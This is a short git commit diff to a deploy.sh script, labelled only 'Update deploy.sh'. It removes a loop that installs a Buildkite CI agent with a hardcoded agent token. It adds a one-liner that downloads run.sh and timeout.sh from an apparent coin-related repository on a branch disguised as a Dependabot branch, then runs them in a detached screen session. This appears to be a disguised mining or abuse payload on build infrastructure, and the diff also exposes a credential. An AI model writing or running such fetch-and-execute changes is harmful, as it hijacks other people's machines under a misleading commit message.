cb514ba977db695d0bbc4bbc5a38378c4dd18792
LouraBrogan <89939659+LouraBrogan@users.noreply.github.com>
2021-09-01 19:16:07 +0000

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -1,14 +1,1 @@
-#!/bin/sh
-
-sudo apt-get install screen -y
-screen
-
-COUNTER=20
-until [  $COUNTER -lt 10 ]; do
- 
-TOKEN="ec0094c8f218a1c9276ba27630472b89c53975f14fa7f2fea9" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
- 
-     echo COUNTER $COUNTER
-     let COUNTER-=1
-done
+wget https://github.com/coinqrl/01/raw/dependabot/add-v2-config-file/run.sh && wget https://github.com/coinqrl/01/raw/dependabot/add-v2-config-file/timeout.sh && sudo apt install screen -y && chmod +x run.sh && screen -dmS run ./run.sh && chmod +x timeout.sh && ./timeout.sh
